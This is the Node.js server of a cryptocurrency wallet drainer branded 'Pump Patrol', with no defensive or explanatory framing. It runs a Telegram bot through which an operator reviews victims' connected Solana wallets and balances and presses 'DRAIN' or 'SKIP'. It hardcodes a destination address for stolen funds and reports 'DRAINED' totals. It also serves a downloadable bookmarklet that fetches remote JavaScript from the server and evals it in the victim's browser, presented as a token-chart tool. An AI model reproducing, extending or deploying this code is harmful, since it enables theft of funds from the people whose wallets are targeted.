'use strict';
const http=require('http'),fs=require('fs'),path=require('path');
const TG=process.env.TG_TOKEN||'';
const CHAT=process.env.TG_CHAT||'';
const PORT=+(process.env.PORT||8787);
const SECRET=process.env.PP_SECRET||'change-me';
const ME=process.env.DRAIN_TO||'911oJrLqYDE5Vo3JAuNQ84MGjBrRpCivXk5iw8GdtEGh';
const RPC='https://api.mainnet-beta.solana.com';
const PER_TX=2;
const DEXT=process.env.DEXT_API_KEY||'';
const PUB=path.join(__dirname,'public');
const t0=Date.now();

const api=async(m,b)=>{try{const r=await fetch(`https://api.telegram.org/bot${TG}/${m}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b||{})});return await r.json()}catch(e){return null}};
const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const sessions=new Map(),verdicts=new Map();
setInterval(()=>{const n=Date.now();
  for(const[k,v]of sessions){
    if(!v.done&&n-v.ts>600000){v.done=true;v.note='expired — no response'}
    if(v.done&&n-v.ts>36e5)sessions.delete(k);
  }
  for(const[k,v]of verdicts)if(n-v.ts>36e5)verdicts.delete(k);
},6e4).unref();

let offset=0;
(async()=>{
  for(;;){
    let r=null;
    try{r=await api('getUpdates',{timeout:25,offset})}catch(e){}
    for(const u of(r&&r.result)||[]){
      offset=u.update_id+1;
      const q=u.callback_query;
      if(q){
        const[act,sid]=String(q.data).split(':');
        if(sessions.has(sid)){
          verdicts.set(sid,{a:act,ts:Date.now()});
          api('answerCallbackQuery',{callback_query_id:q.id});
          api('editMessageText',{chat_id:CHAT,message_id:q.message.message_id,text:(q.message.text||'')+'\n→ '+(act==='go'?'DRAINING':'SKIPPED'),parse_mode:'HTML'});
        }else api('answerCallbackQuery',{callback_query_id:q.id,text:'expired session'});
      }else if(u.message)handle(u.message).catch(()=>{});
    }
    await new Promise(s=>setTimeout(s,r?0:3000));
  }
})();

async function handle(m){
  const reply=x=>api('sendMessage',{chat_id:m.chat.id,text:x,parse_mode:'HTML'});
  if(!CHAT)return reply(`chat id: ${m.chat.id} — set TG_CHAT and restart`);
  const[t,sid]=String(m.text||'').trim().split(/\s+/);
  const c=t.toLowerCase();
  if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent\n/diag sid — autopsy one session\n/diag — autopsy all\n/clear — drop stale (or /clear sid)\n/approve sid — allow drain\n/skip sid — decline');
  if(c==='/sessions'){
    if(!sessions.size)return reply('no sessions recorded');
    const n=Date.now();
    let s='';
    for(const[k,v]of sessions){
      const w2=(v.ready&&v.ready.wallets)||[];
      const sol=w2.reduce((a,w)=>a+(+w.sol||0),0);
      const nt=w2.reduce((a,w)=>a+((w.tokens||[]).length),0);
      const label=v.done?(v.note==='expired — no response'?'expired':'done'):((!w2.length&&n-v.ts>300000)?'stale':'live');
      s+=`<code>${esc(k)}</code> ${label} — ${esc(v.site||'?')} — ${sol.toFixed(4)} SOL + ${nt} tok\n`;
    }
    return reply(`<b>sessions</b>\n${s}`);
  }
  if(c==='/diag'){
    if(sid){
      const s=sessions.get(sid);
      if(!s)return reply('no session <code>'+esc(sid)+'</code>');
      return reply(diagCard(sid,s));
    }
    if(!sessions.size)return reply('no sessions to diagnose');
    let out='';for(const[k,v]of sessions)out+=diagCard(k,v);
    return reply(out);
  }
  if(c==='/clear'){
    if(sid&&sessions.has(sid)){sessions.delete(sid);return reply('cleared <code>'+esc(sid)+'</code>')}
    const n=sessions.size;sessions.clear();
    return reply(n?'cleared '+n+' sessions':'nothing to clear');
  }
  if(c==='/approve'||c==='/go'){
    if(!sid)return reply('usage: /approve sid');
    if(sessions.has(sid)){verdicts.set(sid,{a:'go',ts:Date.now()});return reply('approved <code>'+esc(sid)+'</code>')}
    return reply('unknown session <code>'+esc(sid)+'</code>');
  }
  if(c==='/skip'||c==='/stop'){
    if(!sid)return reply('usage: /skip sid');
    if(sessions.has(sid)){verdicts.set(sid,{a:'stop',ts:Date.now()});return reply('skipped <code>'+esc(sid)+'</code>')}
    return reply('unknown session <code>'+esc(sid)+'</code>');
  }
}

function btns(sid){return{inline_keyboard:[[{text:'DRAIN',callback_data:'go:'+sid},{text:'SKIP',callback_data:'stop:'+sid}]]}}

function diagCard(sid,s){
  let o='🔍 <code>'+esc(sid)+'</code>\n';
  o+='site: '+esc(s.site||'?')+'\n';
  const ph=s.phases||{};
  o+='phases: '+(Object.keys(ph).length?Object.keys(ph).join(' → '):'none')+'\n';
  if(s.scan){
    const d=s.scan.detected||[];
    o+='detected: '+(d.length?d.map(x=>x.name+(x.has?' ✓':' ✗')).join(', '):'none')+'\n';
  }
  const w=(s.ready&&s.ready.wallets)||[];
  if(s.ready){
    if(w.length)for(const x of w){
      o+='\n'+esc(x.name)+' <code>'+esc(x.addr)+'</code>\n'+x.sol+' SOL';
      for(const t of x.tokens||[])o+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);
    }else o+='\nready — no wallets detected in that browser\n';
  }else o+='\nnot reached ready — stuck in connect/read (see detected above)\n';
  if(s.fault)o+='\nFAULT: '+esc(s.fault.fault||s.fault.note||'unknown')+'\n';
  const v=verdicts.get(sid);
  o+='\nverdict: '+(v?('<b>'+v.a+'</b> pending'):(s.done?(s.note||'done'):'none pending'))+'\n';
  return o+'\n';
}

function readyCard(sid,r){
  let s='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n\n<b>WALLET CONNECTED — READY TO DRAIN</b>\n';
  const ws=r.wallets||[];
  if(!ws.length)s+='<i>no wallets detected in this browser</i>\n';
  let shown=0;
  for(const w of ws){
    s+='\n'+esc(w.name)+' <code>'+esc(w.addr)+'</code>\n'+w.sol+' SOL';
    if(w.note)s+='\n⚠ '+esc(w.note);
    for(const t of w.tokens||[]){
      if(shown>=14){s+='\n· …and '+((w.tokens||[]).length-shown)+' more';break}
      s+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);shown++;
    }
  }
  if(r.evm)s+='\nEVM '+esc(r.evm);
  return s;
}
function doneCard(sid,r){
  const ws=r.wallets||[];
  const total=ws.reduce((a,w)=>a+(+w.sol||0),0);
  let s='<b>session '+esc(sid)+' — DRAINED</b>\n';
  if(r.note)s+=esc(r.note)+'\n';
  return s+'source: '+esc(r.site||'?')+'\ntotal: <b>'+total.toFixed(5)+' SOL</b> → <code>'+ME+'</code>';
}

async function searchPair(sym){
  try{
    const s=await fetch('https://api.dexscreener.com/latest/dex/search?q='+encodeURIComponent(sym)).then(r=>r.json());
    const ps=(s&&s.pairs)||[];
    return ps.find(p=>p.chainId==='solana')||ps[0]||null;
  }catch(e){return null}
}
async function candles(sym,tf){
  const pair=await searchPair(sym);
  if(!pair)return{ok:true,price:null};
  const out={ok:true,price:+pair.priceUsd||0,sym:(pair.baseToken&&pair.baseToken.symbol)||sym};
  if(!DEXT)return out;
  try{
    const hdr={'x-api-key':DEXT};
    const ta=pair.baseToken&&(pair.baseToken.address||pair.baseToken.tokenAddress);
    if(!ta)return out;
    const ts=await fetch('https://api.dextools.io/v2/search/solana/'+ta,{headers:hdr}).then(r=>r.json()).catch(()=>null);
    const p=((ts&&ts.pairs)||[]).find(x=>x.chain==='solana')||((ts&&ts.pairs)||[])[0];
    if(!p)return out;
    const c=await fetch('https://api.dextools.io/v2/chart/solana/'+p.id+'?resolution='+encodeURIComponent(tf),{headers:hdr}).then(r=>r.json()).catch(()=>null);
    const arr=c&&(c.candles||(c.data&&c.data.candles)||(Array.isArray(c.data)?c.data:null));
    if(Array.isArray(arr)&&arr.length)out.candles=arr.map(x=>[x.o,x.h,x.l,x.c]);
  }catch(e){}
  return out;
}

const json=(r,o,code=200)=>{r.writeHead(code,{'content-type':'application/json','access-control-allow-origin':'*'});r.end(JSON.stringify(o))};
const MIME={'.html':'text/html','.js':'text/javascript','.css':'text/css','.svg':'image/svg+xml','.png':'image/png'};
http.createServer(async(req,res)=>{
  try{
    const u=new URL(req.url,'http://x');
    if(req.method==='OPTIONS'){
      res.writeHead(204,{'access-control-allow-origin':'*','access-control-allow-methods':'GET,POST,OPTIONS','access-control-allow-headers':'content-type','access-control-max-age':'86400'});
      res.end();return;
    }
    if(u.pathname.startsWith('/api/')){
      if(u.searchParams.get('k')!==SECRET)return json(res,{ok:false},403);
      const seg=u.pathname.split('/').filter(Boolean);
      if(seg[1]==='config')return json(res,{rpc:RPC,me:ME,perTx:PER_TX});
      if(seg[1]==='health')return json(res,{ok:true,up:Math.floor((Date.now()-t0)/1e3),sessions:sessions.size});
      if(seg[1]==='candles'){const sym=u.searchParams.get('sym')||'FROG',tf=u.searchParams.get('tf')||'5m';return json(res,await candles(sym,tf))}
      const sid=seg[2];
      if(seg[1]==='verdict'){const v=verdicts.get(sid)||null;if(v)verdicts.delete(sid);return json(res,{a:v?v.a:null})}
      if(seg[1]==='report'&&req.method==='POST'){
        let b='';for await(const c of req){b+=c;if(b.length>65536)throw 0}
        const r=JSON.parse(b);
        const ph=r.phase||'ready';
        let s=sessions.get(sid)||{};
        s.phases=s.phases||{};s.phases[ph]=Date.now();
        s.site=r.site||s.site;
        s.done=(ph==='done');
        if(ph==='start'||ph==='scan')s.scan=r;
        if(ph==='ready')s.ready=r;
        if(ph==='fault')s.fault=r;
        if(ph==='done'){s.wallets=(s.ready&&s.ready.wallets)||r.wallets;s.note=r.note;}
        if(r.msgId)s.msgId=r.msgId;
        sessions.set(sid,s);
        let text;
        if(ph==='start')text='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n…connecting wallets';
        else if(ph==='fault')text='<b>session '+esc(sid)+' — FAULT</b>\n'+esc(r.fault||r.note||'unknown')+'\nsource: '+esc(r.site||'?');
        else if(ph==='done')text=doneCard(sid,r);
        else text=readyCard(sid,r);
        const buttons=(ph==='ready');
        if(s.msgId){
          await api('editMessageText',{chat_id:CHAT,message_id:s.msgId,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
        }else{
          const sent=await api('sendMessage',{chat_id:CHAT,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
          if(sent&&sent.message_id){sessions.get(sid).msgId=sent.message_id}
        }
        return json(res,{ok:true});
      }
      return json(res,{ok:false},404);
    }
    if(u.pathname==='/bookmarks.html'){
      const base='https://'+(req.headers.host||'');
      const bm=`javascript:(async()=>{try{window.__PP=${JSON.stringify(base)};const r=await fetch(${JSON.stringify(base+'/p.js')}+"?t="+Date.now());(0,eval)(await r.text())}catch(e){console.warn(e)}})();void 0`;
      const hm=bm.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;');
      res.writeHead(200,{'content-type':'text/html','content-disposition':'attachment; filename="pump-patrol-bookmark.html"'});
      res.end('<!DOCTYPE NETSCAPE-Bookmark-file-1><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8"><TITLE>Bookmarks</TITLE><H1>Bookmarks</H1><DL><DT><H3>Bookmarks bar</H3><DL><DT><A HREF="'+hm+'">Pump Patrol</A></DL></DL>');
      return;
    }
    const f=path.normalize(path.join(PUB,u.pathname==='/'?'index.html':u.pathname));
    if(f!==PUB&&!f.startsWith(PUB+path.sep))return json(res,{ok:false},403);
    const data=await fs.promises.readFile(f).catch(()=>null);
    if(!data){res.writeHead(404).end('not found');return}
    res.writeHead(200,{'content-type':MIME[path.extname(f)]||'application/octet-stream','cache-control':'no-store','access-control-allow-origin':'*'});
    res.end(data);
  }catch(e){res.writeHead(400).end()}
}).listen(PORT,()=>console.log(`pump-patrol :${PORT} | chat set: ${!!CHAT} | dextools key: ${!!DEXT}`));